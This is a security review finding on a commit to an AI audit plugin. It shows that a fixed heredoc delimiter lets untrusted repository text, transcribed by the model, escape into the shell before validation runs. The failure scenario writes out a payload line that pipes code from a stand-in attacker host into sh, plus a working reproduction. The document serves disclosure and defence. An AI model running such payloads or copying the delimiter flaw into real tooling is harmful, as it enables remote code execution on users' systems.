# Review 004 — judge-diff

- **Lens:** judge-diff
- **Diff range:** `f50bcc0..4f3d595` (single commit: `4f3d5950bcbbd694961df7a5363aa66116d69383`, "Stop the audit improvising a run, and keep the untrusted slug out of the shell")
- **Verdict:** findings

> **Scope note:** This review covers the judge's own adjudication commits, which no other lens saw.

---

## F1 — major

**Claim:** The fix for the `$(...)` shell-injection finding (security F1) replaces one shell-injection vector with a structurally identical one: a fixed, predictable heredoc delimiter (`SLUG`) that untrusted repository content can collide with to break out of the heredoc and execute arbitrary shell commands, before audit.py's validator ever runs.

**Location:** `plugins/quorum/skills/audit/SKILL.md:92`

**Severity:** major

**What:** SKILL.md Step 2 now tells the model to run `python3 "${CLAUDE_PLUGIN_ROOT}/bin/audit.py" --check-slug - <<'SLUG'` followed by the literal slug text and a closing `SLUG` line, as the mechanism that keeps the untrusted slug 'out of the shell'. The slug is derived from repository content the skill itself calls untrusted ('a spec file's basename, or a name you read out of its prose'). Nothing in the instructions, in audit.py, or in the new selftest.py coverage restricts the transcribed slug text to a single line before it is embedded in the heredoc body, and the delimiter word itself ('SLUG') is fixed and predictable.

**Failure scenario:** If the audited repository's spec (or a filename) contains a multi-line value that the model treats as 'the slug' and transcribes verbatim into the heredoc — e.g. a value whose second line is exactly `SLUG` followed by a line like `$(curl attacker.example/x|sh)` — bash terminates the heredoc at the first line matching the delimiter, and everything after that is parsed and executed as ordinary shell input before Python ever sees the (truncated, and now rejected) stdin. I reproduced this directly: `cat <<'SLUG'\nfoo\nSLUG\ntouch INJECTED\nSLUG` actually creates the file `INJECTED` via `touch`, even though the heredoc delimiter is quoted and even though the eventual `--check-slug` validation (on the truncated content `foo\n`) would report success/failure with no knowledge the injected command ran. This is exactly the class of bug (untrusted audited-repo content reaching a shell before validation) that this commit's commit message and verdict.md (security F1) describe as fixed; the new mechanism only closes the `$(...)`-in-a-quoted-argument sub-case, not the general one. No test in the diff (selftest.py's 21 new `--check-slug` checks) exercises the actual shell heredoc construction the model is instructed to use — they all invoke audit.py directly via subprocess with `stdin=` bytes, never through a real bash heredoc, so this path was never exercised or caught.

**Suggested direction:** Use a delimiter that cannot collide with attacker-influenced content (e.g. a randomly generated token per invocation, or one derived from a value the model never copies verbatim from the target repo), or avoid embedding untrusted multi-line text in a heredoc entirely (e.g. have the model write the raw slug candidate to a scratch file via the Write tool and pipe that file's bytes to audit.py, with audit.py itself rejecting embedded newlines before any shell-level parsing of the value's content occurs).

---

## Notes

state.json review.head=f50bcc0, verdict.head=4f3d595; the range contains exactly one commit (4f3d595). I read the full diff of that commit, re-ran plugins/quorum/bin/selftest.py (258/258 pass, confirming the suite claim), and independently verified the specific claims in the commit message/verdict.md that were checkable from code: (1) Python `re.match` vs `re.fullmatch` trailing-newline divergence from JS `$` — confirmed by direct interpreter tests; (2) the allowlist checks in selftest.py against the real agent frontmatter files (quorum-auditor: Read/Grep/Glob, quorum-scribe: Write) — confirmed; (3) the '21 checks' and 'no test weakened/deleted' claims — confirmed by diffing selftest.py's removed lines (comments only). The one substantive defect I found (F1) is a residual injection vector the diff's own stated threat model (untrusted slug reaching a shell) does not fully close; I did not find evidence the judge hid or misrepresented this — it simply was not considered, and no other lens has seen this commit to catch it. Aside from F1, the commit's other claims held up under direct verification and I found no other collateral damage, suppressed test, or asymmetric guard.
